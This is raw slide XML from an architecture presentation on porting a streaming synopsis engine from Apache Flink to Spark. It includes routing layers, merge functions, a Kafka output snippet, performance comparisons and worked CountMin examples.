              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>synopsisID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> 3  AMS          →  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>SimpleSumFunction</a:t>
            </a:r>
            <a:endParaRPr sz="1050" dirty="0">
              <a:solidFill>
                <a:srgbClr val="A8D8A8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A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>                              (element-wise sum of sketches)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>synopsisID</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t> 4  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>HyperLogLog</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>  →  </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1050" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>SimpleSumFunction</a:t>
            </a:r>
            <a:endParaRPr sz="1050" dirty="0">
              <a:solidFill>
                <a:srgbClr val="A8D8A8"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="100"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>                              (register-wise maximum merge)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250" y="1067308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37474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Merge Function per Algorithm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16625" y="3883660"/>
            <a:ext cx="2612898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629522" y="3883660"/>
            <a:ext cx="3193542" cy="38404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08064" y="3938524"/>
            <a:ext cx="243001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SDE / Flink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0962" y="3938524"/>
            <a:ext cx="3010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SDE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 / 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Spark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16625" y="4267708"/>
            <a:ext cx="2612898" cy="516636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629522" y="4267708"/>
            <a:ext cx="3193542" cy="516636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08064" y="4304284"/>
            <a:ext cx="2430018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SplitStream / OutputTag  (deprecated)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20962" y="4304284"/>
            <a:ext cx="3010662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232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Two filter() on Dataset&lt;Estimation&gt;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16625" y="4784344"/>
            <a:ext cx="2612898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629522" y="4784344"/>
            <a:ext cx="3193542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08064" y="4820920"/>
            <a:ext cx="2430018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ReduceFlatMap + GReduceFlatMap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20962" y="4820920"/>
            <a:ext cx="3010662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232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Single </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1100" b="1" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="1A232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ReduceAggregator</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="1" i="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="1A232E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016625" y="5300980"/>
            <a:ext cx="2612898" cy="516636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629522" y="5300980"/>
            <a:ext cx="3193542" cy="516636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08064" y="5337556"/>
            <a:ext cx="2430018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GReduceFlatMap.setParallelism(1)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20962" y="5337556"/>
            <a:ext cx="3010662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groupByKey(uid)  — distributed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16625" y="5817616"/>
            <a:ext cx="2612898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629522" y="5817616"/>
            <a:ext cx="3193542" cy="516636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08064" y="5854192"/>
            <a:ext cx="2430018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Single-threaded global bottleneck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20962" y="5854192"/>
            <a:ext cx="3010662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Linear horizontal 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6  — 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CEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Serialize Estimations to JSON  |  Write to Kafka estimation_topic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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>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0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64008" cy="640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20700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Both GREEN and PURPLE paths merge into this single output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46504"/>
            <a:ext cx="64008" cy="640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62763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map() serializes each Estimation object to JSON via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67128"/>
            <a:ext cx="64008" cy="640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048256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writeStream.format("kafka")  writes to estimation_topic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87752"/>
            <a:ext cx="64008" cy="640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4688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Trigger: ProcessingTime("1 second")  —  micro-batch cadence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008376"/>
            <a:ext cx="64008" cy="640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889504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JSON output schema is byte-for-byte identical to SDE/Flink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29000"/>
            <a:ext cx="64008" cy="640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31012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E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>No changes needed in any downstream consumer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822191"/>
            <a:ext cx="5486400" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="30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3822191"/>
            <a:ext cx="5486400" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="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849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alibri"/>
              </a:rPr>
              <a:t> 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0"/>
            <a:ext cx="5120640" cy="2267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greenPath.union(purplePath)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.map(est -&gt; mapper.writeValueAsString(est),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   Encoders.STRING())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.writeStream()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.format("kafka")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.option("kafka.bootstrap.servers", brokers)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.option("topic", "estimation_topic")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.trigger(Trigger.ProcessingTime("1 second"))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.option("checkpointLocation", hdfsPath)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.start();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207008"/>
            <a:ext cx="257175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98230" y="1207008"/>
            <a:ext cx="3143250" cy="38404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261872"/>
            <a:ext cx="23888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SDE / Flink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9669" y="1261872"/>
            <a:ext cx="29603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SDE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 / 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Spark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591056"/>
            <a:ext cx="2571750" cy="554126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98230" y="1591056"/>
            <a:ext cx="3143250" cy="554126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1627632"/>
            <a:ext cx="2388870" cy="4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FlinkKafkaProducer&lt;String&gt;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9669" y="1627632"/>
            <a:ext cx="2960370" cy="4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writeStream.format("kafka")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145182"/>
            <a:ext cx="2571750" cy="554126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98230" y="2145182"/>
            <a:ext cx="3143250" cy="554126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2181758"/>
            <a:ext cx="2388870" cy="4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Event-at-a-time delivery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9669" y="2181758"/>
            <a:ext cx="2960370" cy="4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Micro-batch delivery  (1s trigger)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699308"/>
            <a:ext cx="2571750" cy="554126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698230" y="2699308"/>
            <a:ext cx="3143250" cy="554126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2735884"/>
            <a:ext cx="2388870" cy="4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~10–100ms latency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89669" y="2735884"/>
            <a:ext cx="2960370" cy="4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~1–5s latency  (accepted trade-off)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253435"/>
            <a:ext cx="2571750" cy="554126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698230" y="3253435"/>
            <a:ext cx="3143250" cy="554126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3290011"/>
            <a:ext cx="2388870" cy="4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~10K–100K events/sec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89669" y="3290011"/>
            <a:ext cx="2960370" cy="4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2E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>~100K–1M events/sec  (+10x)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807561"/>
            <a:ext cx="2571750" cy="554126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98230" y="3807561"/>
            <a:ext cx="3143250" cy="554126"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0F4F6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0" y="3844137"/>
            <a:ext cx="2388870" cy="4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Same JSON output schema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9669" y="3844137"/>
            <a:ext cx="29603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A232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Same JSON schema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480560"/>
            <a:ext cx="5715000" cy="1993392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454456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  <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Latency vs Throughput Trade-off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910328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7474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Latency increases from ~10ms to ~1s — a deliberate and accepted trade-off.
</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="37474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SDE_Spark</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1200" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="37474F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> targets analytics workloads where 1-second estimation latency is well within SLA bounds. In exchange, throughput increases 10x and state durability is guaranteed across failures.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Flow  —  GREEN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CEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CountMin Sketch  |  synopsisID = 1  |  noOfP = 1  (single partition, direct output)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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>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1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5603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Client  →  Kafka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188720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1243584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{ synopsisID: 1, requestID: 1, uid: 101, noOfP: 1, param: ["StockID", "price", ...]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09928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56232"/>
            <a:ext cx="25603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9019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1  Ingestion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856232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1911096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JSON parsed  →  Request object  (synopsisID=1, CountMin)  and  Datapoint objects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3774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23744"/>
            <a:ext cx="2560320" cy="5029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569463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2  DataRouter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523744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2578608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noOfP=1  |  Forwards request and data as-is (no fan-out)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044951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91256"/>
            <a:ext cx="2560320" cy="5029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2369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2  DataRouter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191256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63240" y="3246120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Single stateful operator handles both requests and data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712464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58768"/>
            <a:ext cx="25603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90448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3  SynopsisProcessor  (key_0)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858768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40" y="3913631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ADD:  SynopsisFactory creates CountMin(uid=101)  →  stored in-memory</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="1100" b="0">
                <a:solidFill>
                  <a:srgbClr val="1A232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DATA: countMin.add("user42", 1)  →  state updated in-memory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37997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26280"/>
            <a:ext cx="25603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4572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3  ESTIMATE request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4526280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63240" y="4581144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countMin.estimate("user42")  →  Estimation(uid=101, value=42, noOfP=1)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047488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93792"/>
            <a:ext cx="25603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5239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4  PathSplitter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5193792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63240" y="5248655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noOfP == 1  →  GREEN PATH  (no merging needed)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71500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861303"/>
            <a:ext cx="25603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5907023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6  Output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5861303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63240" y="5916167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{ uid: 101, synopsisID: 1, estimation: 42, ... }  →  written to  estimation_topic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Flow  —  PURPLE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CEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HyperLogLog  |  synopsisID = 4  |  noOfP = 2  (two partitions, merge required)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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>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2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56032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Client  →  Kafka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188720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1243584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{ synopsisID: 4, requestID: 1, uid: 202, noOfP: 2, param: ["StockID", ...]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09928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56232"/>
            <a:ext cx="2560320" cy="5029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9019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2  RequestRouter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856232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1911096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Registers parallelism=2  |  Fans out ADD to key_0 AND key_1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37744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23744"/>
            <a:ext cx="2560320" cy="5029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569463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2  DataRouter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523744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2578608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Hashes streamID  -&gt;  routes each Datapoint to slot 0 or 1 (not both)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044951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91256"/>
            <a:ext cx="25603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2369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3  SynopsisProcessor  (key_0)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191256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63240" y="3246120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hll_0.add(datapoint)  →  ESTIMATE:  Estimation(uid=202, partial=hll_0, noOfP=2)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712464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58768"/>
            <a:ext cx="25603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90448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3  SynopsisProcessor  (key_1)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858768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40" y="3913631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hll_1.add(datapoint)  →  ESTIMATE:  Estimation(uid=202, partial=hll_1, noOfP=2)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379976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26280"/>
            <a:ext cx="2560320" cy="5029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4572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4  PathSplitter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4526280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63240" y="4581144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noOfP == 2  →  PURPLE PATH  for both partial estimations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047488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93792"/>
            <a:ext cx="2560320" cy="5029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5239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5  ReduceAggregator  (uid=202)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5193792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63240" y="5248655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Collects 2 partials  -&gt;  SimpleSumFunction.reduce()  -&gt;  summed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71500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861303"/>
            <a:ext cx="25603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5907023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Layer 6  Output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5861303"/>
            <a:ext cx="8961120" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F8F9FC"/>
          </a:solidFill>
          <a:ln w="9525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63240" y="5916167"/>
            <a:ext cx="8732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E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>{ uid: 202, synopsisID: 4, estimation: 1543287, ... }  →  estimation_topic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Performance &amp;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ECEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Full comparison  —  SDE / Apache Flink 1.9.3  vs  SDE / Apache Spark 3.5+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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>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3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207008"/>
            <a:ext cx="2520635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261872"/>
            <a:ext cx="23743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6395" y="1207008"/>
            <a:ext cx="4468398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9547" y="1261872"/>
            <a:ext cx="432209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SDE / Flink 1.9.3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54793" y="1207008"/>
            <a:ext cx="4468398" cy="384048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7945" y="1261872"/>
            <a:ext cx="432209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SDE_Spark / Spark 3.5+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591056"/>
            <a:ext cx="2520635" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ECEFF4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627632"/>
            <a:ext cx="2337755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6395" y="1591056"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFEBEE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7835" y="1627632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~10–100ms  (event-at-a-time)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4793" y="1591056"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0F4F6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46233" y="1627632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~1–5s  (micro-batch)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77415"/>
            <a:ext cx="2520635" cy="586359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213991"/>
            <a:ext cx="2337755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Throughput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6395" y="2177415"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF5F5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77835" y="2213991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~10K–100K  events/sec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4793" y="2177415"/>
            <a:ext cx="4468398" cy="586359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46233" y="2213991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~100K–1M  events/sec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63774"/>
            <a:ext cx="2520635" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ECEFF4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800350"/>
            <a:ext cx="2337755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State on crash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6395" y="2763774"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFEBEE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77835" y="2800350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Total loss  (JVM heap only)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54793" y="2763774"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0F4F6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46233" y="2800350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Full recovery  (RocksDB + HDFS/S3)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50133"/>
            <a:ext cx="2520635" cy="586359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3386709"/>
            <a:ext cx="2337755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Merge bottleneck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6395" y="3350133"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF5F5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77835" y="3386709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Yes — parallelism=1  single thread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54793" y="3350133"/>
            <a:ext cx="4468398" cy="586359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46233" y="3386709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No — groupByKey(uid)  distributed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936491"/>
            <a:ext cx="2520635" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ECEFF4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3973068"/>
            <a:ext cx="2337755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State size limit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6395" y="3936491"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFEBEE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77835" y="3973068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JVM heap  (~GB)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54793" y="3936491"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0F4F6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46233" y="3973068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Local SSD  (effectively unlimited)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522851"/>
            <a:ext cx="2520635" cy="586359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4559427"/>
            <a:ext cx="2337755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Security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6395" y="4522851"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF5F5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77835" y="4559427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A232E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CVE Jackson 2.9.5  +  RCE case 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54793" y="4522851"/>
            <a:ext cx="4468398" cy="586359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46233" y="4559427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Jackson 2.15+  /  no dynamic loading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109210"/>
            <a:ext cx="2520635" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="ECEFF4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5145786"/>
            <a:ext cx="2337755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4F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Ecosystem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86395" y="5109210"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFEBEE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977835" y="5145786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Flink 1.9.3  —  EOL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54793" y="5109210"/>
            <a:ext cx="4468398" cy="586359"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E0F4F6"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="EC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46233" y="5145786"/>
            <a:ext cx="4285518" cy="51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32E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Spark 3.5  —  actively maintained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SDE_Spark  —  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CEFF4"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fully self-contained Maven project  |  No dependency on SDE/Flink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0360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Calibri"/>
              </a:rPr>
              <a:t>SDE_Spark Architecture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928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B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>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4</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="900" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> / 1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="900" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B0BEC5"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>5</a:t>
            </a:r>
            <a:endParaRPr sz="9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207008"/>
            <a:ext cx="11457432" cy="5230368"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="30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207008"/>
            <a:ext cx="11457432" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="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alibri"/>
              </a:rPr>
              <a:t> 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499616"/>
            <a:ext cx="11091672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SDE_Spark/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├── pom.xml                      ← Spark 3.5  /  Java 17  /  Jackson 2.15+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└── src/main/java/infore/sde/spark/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├── SDESparkApp.java          ← Main entry point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├── messages/                 ← POJOs  (Serializable,  same JSON contract as SDE)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│   ├── Datapoint.java        ├── Request.java        └── Estimation.java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├── synopses/                 ← Algorithms  (Serializable from day one)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│   ├── Synopsis.java  (abstract base)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│   ├── CountMin.java  [ID=1]            ├── Bloomfilter.java     [ID=2]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│   ├── AMSsynopsis.java  [ID=3]         └── HyperLogLogSynopsis  [ID=4]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│   └── SynopsisFactory.java  ← case 1/2/3/4 → implementation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├── reduceFunctions/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│   ├── SimpleSumFunction.java  (CountMin, AMS, HyperLogLog)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│   └── SimpleORFunction.java   (BloomFilter)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├── ingestion/     routing/     processing/     aggregation/     output/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│    Layer 1        Layer 2       Layer 3         Layers 4-5      Layer 6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└── test/java/infore/sde/spark/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    ├── serialization/    ← MUST pass before any stateful layer work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A8D8A8"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
              </a:rPr>
              <a:t>        ├── processing/       └── integration/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9144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</a:rPr>
              <a:t>Validated Example  —  GREEN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</a:rPr>
              <a:t>CountMin Sketch  |  uid=10  |  noOfP=1  |  Validated 2026-03-25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400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 1: ADD CountMin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48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C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Producer -&gt; request_topic:  { synopsisID:1, uid:10, noOfP:1, param:["StockID","price",...] }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Layer 2 (DataRouter): noOfP=1, forwards as-is with key=Forex</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Layer 3 (SynopsisProcessor): Creates CountMin sketch uid=10 on key=Forex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2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400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 2: Send 5 Data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48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C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>AAPL 182.50  |  AAPL 183.00  |  GOOG 141.20  |  AAPL 184.00  |  MSFT 378.90</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DataRouter: no parallelism registered, forwards with key=Forex</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SynopsisProcessor: CountMin uid=10 adds each (StockID, price) pair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2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400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 3: ESTIMATE query='AAPL'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48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C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SynopsisProcessor: estimate("AAPL") = 182.50 + 183.00 + 184.00 = 549.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PathSplitter: noOfP==1 -&gt; GREEN path (direct to output)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Layer 6 -&gt; estimation_topic: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1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000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>{"uid":10, "synopsisID":1, "estimation":"549.0", "param":["AAPL"], "noOfP":1}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7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000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Result: CountMin AAPL = 549.0  (sum of 3 AAPL prices: 182.50 + 183.00 + 184.00)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92824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SDE_Spark Architecture  |  March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3112" y="6592824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9144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</a:rPr>
              <a:t>Validated Example  —  PURPLE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</a:rPr>
              <a:t>CountMin Sketch  |  uid=50  |  noOfP=2  |  Validated 2026-03-25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00080"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 4: ADD CountMin (noOfP=2)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38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C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DataRouter: registers parallelism=2 on key=Forex</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Fans out ADD -&gt; Forex_2_KEYED_0 (creates CountMin uid=50)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                     -&gt; Forex_2_KEYED_1 (creates CountMin uid=50)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0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00080"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 5: Send 6 Data Events (varied streamIDs)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0000"/>
            <a:ext cx="5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C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DataRouter hashes streamID % 2:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  EURUSD -&gt; slot 0 -&gt; Forex_2_KEYED_0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  GBPUSD -&gt; slot 1 -&gt; Forex_2_KEYED_1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>  USDJPY -&gt; slot 1 -&gt; Forex_2_KEYED_1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0" y="2280000"/>
            <a:ext cx="5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00050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Partition 0: AAPL 185.00, TSLA 248.50</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="500050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Partition 1: AAPL 186.00, AAPL 187.00,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="500050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>                    NVDA 920.00, GOOG 142.00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00080"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Step 6: ESTIMATE query='AAPL' (noOfP=2)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8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C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DataRouter fans out ESTIMATE to both partitions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Partition 0: estimate("AAPL") = 185.0       (one AAPL price)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Partition 1: estimate("AAPL") = 373.0       (186.00 + 187.00)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PathSplitter: noOfP&gt;1 -&gt; PURPLE path -&gt; ReduceAggregator</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="900">
                <a:solidFill>
                  <a:srgbClr val="3C3C3C"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ReduceAggregator: collects 2/2 partials -&gt; SimpleSumFunction: 185.0 + 373.0 = 558.0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7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00080"/>
                </a:solidFill>
              </a:rPr>
              <a:t>{"uid":50, "synopsisID":1, "estimation":558.0, "param":["AAPL"], "noOfP":2}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2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23232"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Summary:  GREEN uid=10 AAPL = 549.0  |  PURPLE uid=50 AAPL = 558.0 (merged from 185.0 + 373.0)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="800">
                <a:solidFill>
                  <a:srgbClr val="323232"/>
                </a:solidFill>
              </a:rPr>
              <a:t/>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="800">
                <a:solidFill>
                  <a:srgbClr val="323232"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Path         uid    Query    Partition data                    Partial    Final</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="800">
                <a:solidFill>
                  <a:srgbClr val="323232"/>
                </a:solidFill>
              </a:rPr>
              <a:t>GREEN        10     AAPL     182.50 + 183.00 + 184.00         --              549.0</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr sz="800">
                <a:solidFill>
                  <a:srgbClr val="323232"/>
